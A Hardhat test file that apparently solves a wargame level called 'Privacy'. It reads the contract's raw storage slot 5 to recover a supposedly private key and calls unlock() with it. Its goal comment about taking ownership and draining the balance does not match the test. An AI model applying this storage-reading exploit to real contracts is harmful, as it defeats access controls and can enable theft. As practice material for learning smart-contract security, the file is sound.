import {expect} from "./utils/chai-setup";
import {ethers, deployments, getNamedAccounts} from 'hardhat';
import { Deployment } from "hardhat-deploy/dist/types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import {setup} from './utils/index';
import type { Privacy } from '../typechain-types';

// Goal: 1. you claim ownership of the contract; 2. you reduce its balance to 0

describe('Privacy', () => {
  let deployer: SignerWithAddress;
  let user1: SignerWithAddress;
  let privacy: Privacy;

  beforeEach(async () => {
    ({deployer, user1} = await setup());

    await deployments.fixture(['privacy']);

    const PrivacyDeployment: Deployment = await deployments.get('Privacy');
    privacy = await Promise.resolve(ethers.getContractAt('Privacy', PrivacyDeployment.address) as Promise<Privacy>);
  });


  it('', async () => {
    let key = await ethers.provider.getStorageAt(privacy.address, 5);
    let keyBytes16 = ethers.utils.hexDataSlice(key, 0, 16);
    await privacy.unlock(keyBytes16);

    expect(await privacy.locked()).to.equal(false);
  });

});
